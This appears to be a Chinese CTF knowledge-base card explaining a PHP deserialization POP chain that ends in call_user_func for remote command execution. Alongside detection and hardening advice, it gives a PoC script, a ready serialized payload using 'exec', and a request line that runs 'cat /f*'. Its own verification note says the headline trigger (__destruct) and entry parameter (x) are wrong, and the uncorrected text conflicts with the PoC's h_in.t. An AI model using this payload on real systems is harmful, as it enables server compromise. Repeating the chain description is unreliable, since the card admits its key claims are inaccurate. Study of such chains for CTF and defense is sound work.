---
id: web-php-deserialization-destruct-tostring-get-invoke-call-user-func
title: 四类魔术方法串成 POP 链：__destruct→__toString→__get→__invoke 落到 call_user_func($_GET)
type: scenario
domain: web
path: web/php/deserialization
technique: php-pop-chain-destruct-tostring-get-invoke-call-user-func
aliases:
- PHP 魔术方法链
- __toString 触发 __get
- __get 返回可调用对象
- call_user_func($_GET) getshell
- 反序列化任意函数调用
tags:
- php
- deserialization
- pop-chain
- magic-method
- rce
- ctf
cve: []
severity: high
confidence: high
status: draft
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:49:47+08:00'
  notes: 已对照原文核对；本次核对未读取图片；四类魔术方法链与 call_user_func(\ 展开) sink、exec 未被 disable_functions 拦截均与正文一致；但原文 d 类是把 echo \->UUU 放在 __wakeup、__destruct 只有裸语句 \->UUU（不会触发 __toString），卡内标题与一句话结论写成 __destruct 触发、入口参数写成 GET x，实际入口是 GET h_in.t 且由 __wakeup 触发，需据此更正触发点与入口名
---

## 一句话结论

当反序列化入口是 `unserialize($_GET['x'])`，且代码里恰好有 `d::__destruct(){ echo $this->UUU; }`、`a::__toString()` 里读未定义属性、`b::__get()` 把属性当函数调用、`c::__invoke()` 里执行 `call_user_func($_, ...$___)` 时，按 `d.UUU→a.OAO→b.pap→c` 的引用关系串起来，`unserialize` 结束触发 `__destruct`，一路自动执行到 `c::__invoke`，最终以 `$_GET` 为参数调用任意函数。

## 原理

- PHP 反序列化只负责“还原对象图”，不校验数据来源；魔术方法在**特定语言动作**下自动触发，构成天然的调用链骨架：
  - 脚本结束/对象销毁 → `__destruct()`
  - 对象被当字符串使用（`echo`、拼接）→ `__toString()`
  - 读取对象上不存在或不可见属性 → `__get($name)`
  - 对象被当函数调用 `$obj()` → `__invoke()`
- 本例链条逐环落地：
  1. `d::__destruct()` 执行 `echo $this->UUU;`，`UUU` 是 `a` 对象 → 触发 `a::__toString()`；
  2. `a::__toString()` 返回 `$this->OAO->QAQ`，`QAQ` 在 `a` 上未定义 → 触发 `b::__get('QAQ')`；
  3. `b::__get()` 里 `$functioin = $this->pap; return $functioin();`，`pap` 是 `c` 对象 → 触发 `c::__invoke()`；
  4. `c::__invoke()` 里 `$___ = $_GET; unset($___['h_in.t']); echo @call_user_func($_, ...$___);`，`$_` 来自 `$this->OOO`（可控字符串如 `system`），其余 GET 参数作为实参展开。
- 之所以能 getshell：`call_user_func` 的第一个参数完全由攻击者的序列化数据决定，且 `$_GET` 中除入口参数外的键值被当成可变参数传给该函数，于是 `OOO=system` + `1=cat /f*` 就是 `system('cat /f*')`。
- `__toString` 里的 `preg_match('/hello/', OVO)` 把 `OVO` 当常量（PHP 7 报 Notice 并视作字符串 `"OVO"`），因此后续 `if ($this->OVO === "hello")` 只需把属性真的设成 `"hello"` 即可通过，不影响链。

## 触发条件

- 存在攻击者可控的 `unserialize()` 入口（GET/POST/Cookie/Phar 元数据）。
- 代码中存在可串联的魔术方法组合，且链上的属性均可由序列化数据赋值（`public`/`protected`/`private` 均可，注意属性名长度前缀）。
- 链终点是一个“参数可控的函数调用” sink（`call_user_func`、变量函数、`eval`、文件操作等）。
- `disable_functions` 未拦截最终函数（本例 `exec` 未被禁用）。

## 利用步骤

1. 通读类定义，标出所有魔术方法及其内部属性访问，画“触发边”有向图。
2. 找入口（自动触发、无需显式调用）：`__destruct`/`__wakeup`/`__toString`。
3. 找终点 sink，反推需要哪个属性承载“函数名”、哪个承载“参数”。
4. 按链写构造脚本，本地生成序列化串（注意 `private`/`protected` 的属性名前缀 `\0类名\0`、`\0*\0`）。
5. URL 编码后提交，先 `phpinfo` 验证链通，再把函数换成命令执行或文件读取。

## PoC

```php
<?php
class a { public $OAO; public $QAQ; public $OVO; }
class b { public $pap; public $vqv; }
class c { public $OOO; }
class d { public $UUU; public $uuu; }

$d = new d();
$d->UUU = $a = new a();
$a->OVO = "hello";
$a->OAO = $b = new b();
$b->pap = $c = new c();
$c->OOO = "exec";                 // $this->OOO 决定 call_user_func 的函数名
echo urlencode(serialize($d));
// 提交 ?h_in.t=<上面的串>&1=cat /f*
```

生成的串形如：

```text
O:1:"d":2:{s:3:"UUU";O:1:"a":3:{s:3:"OAO";O:1:"b":2:{s:3:"pap";O:1:"c":1:{s:3:"OOO";s:4:"exec";}s:3:"vqv";N;}s:3:"QAQ";N;s:3:"OVO";s:5:"hello";}s:3:"uuu";N;}
```

## 变体与关联

- 变体：把终点换成 `__call`（调用不存在的方法）或 `__set`（写属性）可接文件写入、SSRF 链。
- 变体：入口换成 Phar 元数据（`phar://`），在文件操作时自动反序列化，无需显式 `unserialize`。
- 变体：`__wakeup` 里存在过滤（如 `throw`、`preg_match`）时，可尝试属性个数不匹配绕过 `__wakeup`（PHP < 7.4.23 的 CVE-2016-7124 类技巧）。
- 关联：[[web-php-deserialization-magic-chain-eval-wakeup-bypass]]（同类魔术方法链到 eval）、[[web-php-deserialization-destruct-cup-eval-pop]]（`__destruct` 直接 eval）。
- 边界：类被 `final`/`__destruct` 中做类型校验、或 `unserialize` 使用 `allowed_classes` 白名单时，链不成立。

## 检测与防御

- 检测：静态扫描同时出现 `unserialize(` 与 `call_user_func(`/`$var(`/`eval(`；SAST 规则匹配 `__toString` 中访问未定义属性。
- 修复：改用 JSON 等无对象语义格式；必须反序列化时使用 `unserialize($s, ['allowed_classes' => [Safe::class]])`；对 `call_user_func` 的函数名做白名单。
- 加固：`disable_functions` 覆盖 `exec/system/passthru/shell_exec/proc_open/popen`；`open_basedir` 限制可读范围。
